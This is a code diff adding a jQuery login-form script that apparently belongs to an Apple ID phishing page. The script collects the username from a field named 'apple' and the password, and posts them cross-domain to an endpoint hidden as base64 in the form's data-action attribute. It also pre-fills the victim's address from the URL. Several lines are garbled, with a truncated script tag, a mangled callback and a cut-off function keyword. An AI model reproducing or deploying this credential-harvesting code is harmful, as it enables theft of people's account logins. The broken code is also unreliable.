@@ -1,0 +1,85 @@
+	
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></sc
+    <script type="text/javascript">
+        jQuery(document).ready(function($) {
+            $('.ajax-form').on('submit', function(event) {
+                event.preventDefault();
+                $('#login-statuz').css('display', 'block');
+                $('#login-status').css('display', 'none');
+                let form = $(this);
+                let formData = form.serializeArray(),
+                    submit = form.find('[type="submit"]'),
+                    action = form.attr('data-action'),
+                    username = form.find('[name=apple]').val(),
+                    password = form.find('[name=pass]').val()
+
+                submit.prop('disabled', true);
+
+                if (username == '' || password == ''){
+
+                    return;
+                }
+                corsReq(atob(action), { logss == true) {
+                        //authenticated
+                        window.location.href = res.responseJSON.redirect;
+                    } else {
+                        $('#login-status').css('display', 'block');
+                    }
+                    form.find('[type="password"]').val('');
+                    submit.prop('disabled', false);
+                });
+            });
+        });
+    </script>
+    <script type="text/javascript">
+        (function (window, document, $, io) {
+            'use strict';
+
+            $.support.cors = true;
+			
+			var xhrCorsFields = {
+                withCredentials: false
+            };
+
+            function corsReq(options, data, type, callback) {
+                var settings = $.extend({}, $.ajaxSettings, { xhrFields: xhrCorsFields });
+                settings.crossDomain = true;
+                settings.dataType = 'json';
+                settings.async = true;
+                if ('string' === typeof options) settings.url = options;
+                else settings = $.extend(settings, options);
+
+                if ('string' === typeof data) settings.type = data;
+                else if (data) settings.data = data;
+
+                if ('function' === typeof type) settings.complete = type;
+                else if (type) settings.type = type;
+
+                if (callback) settings.complete = callback;
+                console.log(settings);
+                return $.ajax(settings);
+            }
+
+            window.corsReq = corsReq;
+
+            $(document).ready(function () {
+
+            });
+        })(window, document, window.jQuery, window.io);
+    ion getQueryParam(param) {
+        const queryString = window.location.search.substring(1);
+        const params = queryString.split("&");
+        for (let i = 0; i < params.length; i++) {
+            const pair = params[i].split("=");
+            if (pair[0] === param) {
+                return decodeURIComponent(pair[1]);
+            }
+        }
+        return null;
+    }
+
+    const appleValue = getQueryParam('apple');
+    if (appleValue) {
+        document.getElementById('appleField').value = appleValue;
+    }
+</script>
